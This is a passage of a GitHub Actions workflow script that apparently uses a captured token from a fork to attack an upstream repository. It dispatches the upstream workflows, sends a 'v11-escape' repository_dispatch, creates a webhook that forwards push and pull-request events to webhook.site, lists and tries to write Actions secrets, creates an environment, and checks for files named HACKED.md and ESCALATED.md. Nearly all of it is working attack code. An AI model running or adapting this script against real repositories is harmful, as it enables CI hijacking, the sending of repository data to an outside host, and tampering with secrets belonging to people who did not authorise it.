          R=$(curl -sS -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/workflows")
          echo "Upstream workflows:"
          echo "$R" | jq -r '.workflows[]? | "\(.id) \(.name) \(.path) \(.state)"' 2>/dev/null | head -5
          echo ""

          # Try to dispatch each
          WIDS=$(echo "$R" | jq -r '.workflows[]?.id' 2>/dev/null)
          for WID in $WIDS; do
            DR=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: token $RT" \
              -H "Content-Type: application/json" \
              "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/workflows/$WID/dispatches" \
              -d '{"ref":"main","inputs":{}}')
            CODE=$(echo "$DR" | tail -1)
            BODY=$(echo "$DR" | sed '$d')
            echo "A01 dispatch wid=$WID = $CODE body='$(echo "$BODY" | head -c 150)'"
          done
          echo ""

          # â”€â”€ B: repository_dispatch (custom webhook) â”€â”€
          echo "--- B: repository_dispatch on upstream ---"
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Content-Type: application/json" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/dispatches" \
            -d '{"event_type":"v11-escape","client_payload":{"audit":"v11"}}')
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "B01 repository_dispatch = $CODE body='$(echo "$BODY" | head -c 150)'"
          echo ""

          # â”€â”€ C: Create webhook on upstream â”€â”€
          echo "--- C: Webhook creation ---"
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Content-Type: application/json" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/hooks" \
            -d '{"name":"web","config":{"url":"https://webhook.site/test","content_type":"json"},"events":["push","pull_request"],"active":true}')
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "C01 createWebhook upstream = $CODE body='$(echo "$BODY" | head -c 200)'"
          echo ""

          # â”€â”€ D: GitHub Apps installation confusion â”€â”€
          echo "--- D: Apps installation ---"
          R=$(curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/installation")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "D01 GET installation upstream = $CODE body='$(echo "$BODY" | head -c 200)'"

          R=$(curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: token $RT" \
            "$GH/repos/$FORK_OWNER/$FORK_REPO/installation")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "D02 GET installation fork = $CODE body='$(echo "$BODY" | head -c 200)'"

          # Try to access as installation
          R=$(curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: token $RT" \
            "$GH/app/installations")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "D03 GET app/installations = $CODE body='$(echo "$BODY" | head -c 200)'"
          echo ""

          # â”€â”€ E: Actions secrets access â”€â”€
          echo "--- E: Secrets access ---"
          R=$(curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "E01 GET upstream secrets = $CODE body='$(echo "$BODY" | head -c 200)'"

          R=$(curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets/public-key")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "E02 GET upstream secrets public-key = $CODE body='$(echo "$BODY" | head -c 200)'"

          # Try to set a secret
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" \
            -H "Content-Type: application/json" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets/V11_TEST" \
            -d '{"encrypted_value":"AAAA","key_id":"test"}')
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "E03 PUT upstream secret = $CODE body='$(echo "$BODY" | head -c 200)'"

          # â”€â”€ F: Environment secrets â”€â”€
          echo "--- F: Environments ---"
          R=$(curl -sS -w "\nHTTP_%{http_code}" \
            -H "Authorization: token $RT" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/environments")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "F01 GET upstream environments = $CODE body='$(echo "$BODY" | head -c 200)'"

          # Create environment on upstream
          R=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" \
            -H "Content-Type: application/json" \
            "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/environments/v11-audit")
          CODE=$(echo "$R" | tail -1)
          BODY=$(echo "$R" | sed '$d')
          echo "F02 PUT create environment = $CODE body='$(echo "$BODY" | head -c 200)'"

      # â”€â”€ STEP 10: Final verification â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
      - name: Step 10 â€” Final verification
        if: always()
        run: |
          set +e
          echo "=== V11 FINAL VERIFICATION ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"

          echo "--- Upstream state ---"
          curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/branches" \
            | jq -r '.[]? | {name:.name,sha:.commit.sha,protected:.protected}' | jq -c . 2>/dev/null
          echo ""

          echo "--- Upstream refs (check for new ones) ---"
          curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/matching-refs/refs/" \
            | jq -r '.[]? | {ref:.ref,sha:.object.sha}' | jq -c . 2>/dev/null
          echo ""

          echo "--- Check artifacts ---"
          for F in V11-DIRECT.md V11-VERSION.md HACKED.md ESCALATED.md; do
            R=$(curl -sS -o /dev/null -w "HTTP_%{http_code}" \
              -H "Authorization: token $RT" \
              "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/contents/$F")
            echo "$F = $R"
          done
          echo ""

          echo "--- Upstream description check ---"
          curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO" \
            | jq '{description,default_branch,visibility,homepage}'
          echo ""

          echo "--- Any new PRs on upstream? ---"
          curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/pulls?state=all" \
            | jq -r '.[]? | {number:.number,title:.title,state:.state,user:.user.login}' | jq -c . 2>/dev/null
          echo ""

          echo "--- Any deployments? ---"
          curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/deployments" \
            | jq -r '.[]? | {id:.id,environment:.environment,ref:.ref}' | jq -c . 2>/dev/null
          echo ""

          echo "--- Any releases? ---"
          curl -sS -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/releases" \
            | jq -r '.[]? | {id:.id,tag:.tag_name,name:.name,draft:.draft}' | jq -c . 2>/dev/null
          echo ""

          echo "=== V11 COMPLETE ==="
